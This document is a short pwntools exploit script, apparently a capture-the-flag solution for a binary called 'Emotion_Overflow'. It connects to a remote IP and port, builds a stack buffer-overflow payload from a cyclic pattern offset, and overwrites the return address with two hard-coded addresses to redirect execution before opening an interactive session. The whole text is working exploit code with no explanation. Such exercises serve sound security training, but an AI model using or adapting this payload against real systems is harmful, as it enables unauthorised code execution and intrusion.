from pwn import *

local = False

if local:
    p = process("./Emotion_Overflow")
    input("attach gdb")
else:
    p = remote("20.219.137.184", 13373)

msg = p.recv()
print(msg)

payload = cyclic(500)
payload = payload[:cyclic_find('faab')] + p64(0x000000000040138c) + p64(0x4012ef)
p.sendline(payload)

p.interactive()
